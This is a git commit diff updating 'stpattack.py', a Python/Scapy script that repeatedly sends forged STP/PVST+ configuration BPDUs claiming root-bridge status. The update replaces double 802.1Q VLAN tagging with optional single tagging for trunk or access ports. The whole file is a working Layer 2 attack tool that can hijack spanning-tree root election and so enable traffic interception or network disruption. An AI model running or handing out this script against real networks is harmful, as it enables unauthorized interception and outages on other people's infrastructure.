6b5a0c9cb43b4e0750c5d81fb7e8215f05b18ff1
preamcie <112178665+preamcie@users.noreply.github.com>
2024-10-17 17:02:19 +0800

    Update stpattack.py

--- stpattack.py
+++ stpattack.py
@@ -1,16 +1,8 @@
 from scapy.all import *
 from scapy.layers.l2 import Ether, LLC, STP, Dot1Q
 
-# Ask for user input on priority, VLAN ID, and second VLAN ID
-user_priority = int(input("Enter the bridge priority (should be a multiple of 4096): "))
-vlan_id = int(input("Enter the outer VLAN ID: "))
-inner_vlan_id = int(input("Enter the inner VLAN ID: "))
-
-# Ensure the priority is correctly formatted
-priority = user_priority if user_priority % 4096 == 0 else (user_priority // 4096) * 4096
-
-# Calculate the final bridge priority including the outer VLAN ID
-bridge_priority = priority + vlan_id  # Ensure the sum does not exceed 65535
+# Ask for user input on VLAN ID
+vlan_id = int(input("Enter the VLAN ID (use 1 for non-trunk/access port simulation): "))
 
 # Interface MAC address
 src_mac = get_if_hwaddr("eth0")
@@ -18,21 +10,23 @@ src_mac = get_if_hwaddr("eth0")
 # Ethernet frame for STP BPDUs
 ether = Ether(dst="01:80:C2:00:00:00", src=src_mac)
 
-# Outer VLAN tag (802.1Q)
-outer_vlan = Dot1Q(vlan=vlan_id)
-
-# Inner VLAN tag (802.1Q)
-inner_vlan = Dot1Q(vlan=inner_vlan_id)
+# VLAN tag for trunk port simulation (for non-trunk/access, no VLAN tag will be added)
+if vlan_id == 1:
+    # For non-trunk (or VLAN 1), do not use VLAN tagging
+    vlan = None
+else:
+    # For trunk ports, use 802.1Q VLAN tagging
+    vlan = Dot1Q(vlan=vlan_id)
 
 # STP Configuration BPDU
 bpdu = STP(
     version=0,
     bpdutype=0,
     bpduflags=0,
-    rootid=bridge_priority,
+    rootid=32768 + vlan_id,  # Bridge priority (VLAN specific)
     rootmac=src_mac,
     pathcost=4,
-    bridgeid=bridge_priority,
+    bridgeid=32768 + vlan_id,  # Bridge ID should include the VLAN
     bridgemac=src_mac,
     portid=0x8001,
     age=1,
@@ -44,11 +38,16 @@ bpdu = STP(
 # Encapsulate in LLC
 llc = LLC(dsap=0x42, ssap=0x42, ctrl=3)
 
-# Complete packet with double VLAN tagging
-packet = ether / outer_vlan / inner_vlan / llc / bpdu
+# Construct the packet
+if vlan is None:
+    # For non-trunk/access port (VLAN 1), no VLAN tag
+    packet = ether / llc / bpdu
+else:
+    # For trunk port (other VLANs), add VLAN tag
+    packet = ether / vlan / llc / bpdu
 
 try:
-    print("Sending packets... Press Ctrl+C to stop.")
+    print("Sending PVST+ BPDU packets... Press Ctrl+C to stop.")
     while True:
         sendp(packet, iface="eth0", verbose=False)
 except KeyboardInterrupt:
